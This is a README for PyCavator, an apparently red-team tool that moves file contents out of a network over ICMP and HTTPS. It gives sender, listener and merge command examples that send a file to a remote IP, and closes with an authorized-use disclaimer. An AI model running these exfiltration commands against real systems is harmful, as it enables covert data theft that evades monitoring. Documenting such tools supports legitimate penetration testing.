# PyCavator

PyCavator is a Python-based tool that can be used to send and receive data using ICMP/HTTPS packets. 
The tool can be used for authorized red teaming and penetration testing activities or educational purposes. 
It provides a sender mode to exfiltrate data from a file and a listener mode to receive incoming data and save it in chunks or to a single file. 
The tool also includes a merge mode to merge output files with part numbers in the specified range. 
With PyCavator, users can easily exfiltrate or receive data using ICMP packets in a secure and efficient manner.

## Usage

### ICMP 

<b>Required libraries:</b><br/>
- All libraries are part of the default Python installation.<br/>

#### Examples:
  <b>Sender mode: exfiltrate data from a file</b><br/>
```bash  
python pycavator-icmp.py -f input.txt -d 192.168.1.101
```  
  <b>Listener mode: listen for incoming data and save in chunks</b><br/>
```bash
python pycavator-icmp.py -l -s 192.168.1.100 -w c
```  
  <b>Listener mode: listen for incoming data and save to a single file</b><br/>
```bash  
python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
```  
  <b>Merge mode: merge output files with part numbers in the specified range</b><br/>
```bash
python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
```

### HTTPS 

<b>Required libraries:</b><br/>
- `argparse`: used for parsing command-line arguments<br/>
- `requests`: used for sending HTTP requests<br/>
- `Flask`: used for creating the web server<br/>
- `ssl`: used for configuring SSL/TLS encryption<br/>
- `urllib3`: used for disabling SSL warnings<br/>

#### Examples:
  <b>Sender mode: exfiltrate data from a file</b><br/>
```bash
python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
```
  <b>Listener mode: listen for incoming data and save to a single file</b><br/>
```bash
python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..._adQssw5c"
``` 

## Installation

PyCavator requires Python 3 to be installed. To install PyCavator, clone the repository and install the required Python modules:

```bash
git clone https://github.com/kryptohaker/PyCavator.git
cd PyCavator
pip install -r requirements.txt
```

## How to Contribute

If you would like to contribute to PyCavator, please fork the repository and submit a pull request.

## Disclaimer

This tool is intended for authorized/legitimate red teaming and pentesting activities or educational purposes only. The author of the tool is not responsible for any misuse or illegal activities that may arise from the use of this tool. Users are responsible for complying with all applicable laws and regulations. By using this tool, you acknowledge that you have read this disclaimer and agree to its terms.

## License

This project is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0) license. This means that you are free to share and distribute the original work with proper attribution to the original author, but you may not modify the work or use it for commercial purposes. Additionally, any new versions of the work must be distributed under the same license and with proper attribution to the original author. See the [LICENSE](LICENSE) file for details.




